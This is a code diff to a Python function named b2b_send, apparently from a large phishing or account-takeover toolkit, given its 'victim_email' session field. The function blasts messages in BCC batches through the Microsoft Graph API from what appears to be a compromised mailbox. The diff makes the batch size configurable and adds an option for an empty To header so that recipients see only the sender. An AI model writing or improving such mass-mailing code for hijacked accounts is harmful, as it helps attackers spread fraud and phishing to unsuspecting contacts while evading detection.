@@ -16601,6 +16601,9 @@ def b2b_send():
     attachments = data.get('attachments', [])
     api_method  = data.get('api_method', 'graph')
 
+    to_header   = (data.get('to_header') or 'hidden').strip().lower()
+    batch_size  = max(5, min(100, int(data.get('batch_size') or 50)))
+
     # Resolve sender's own email so we can filter it out of recipients
     sender_email = (s.get('victim_email') or '').strip().lower()
 
@@ -16632,8 +16635,8 @@ def b2b_send():
         send_count_since_refresh = 0
 
         if send_mode in ('bcc', 'cc') or bcc_mode:
-            # ── BATCH CC / BCC MODE: Blast all recipients in batches of 50 ──
-            BATCH_SIZE = 50
+            # ── BATCH CC / BCC MODE: Blast all recipients in batches ──
+            BATCH_SIZE = batch_size
             valid_recipients = [r.strip().lower() for r in recipients if r.strip() and '@' in r]
             sender_addr = s.get('victim_email') or sender_email or 'me'
 
@@ -16675,11 +16678,14 @@ def b2b_send():
                     if cc_rec:
                         msg_obj['ccRecipients'] = cc_rec
                 else:
-                    # BCC Mode: Sender in To (undisclosed recipients), all batch members hidden in BCC
+                    # BCC Mode:
+                    # When to_header is 'hidden' (default), toRecipients is empty [] so recipients only see From.
+                    # When to_header is 'sender', toRecipients contains sender_addr.
+                    to_rec = [{'emailAddress': {'address': sender_addr}}] if to_header == 'sender' else []
                     msg_obj = {
                         'subject': subj_final,
                         'body': {'contentType': 'HTML', 'content': body_final},
-                        'toRecipients': [{'emailAddress': {'address': sender_addr}}],
+                        'toRecipients': to_rec,
                         'bccRecipients': [{'emailAddress': {'address': r}} for r in batch],
                         'importance': priority
                     }
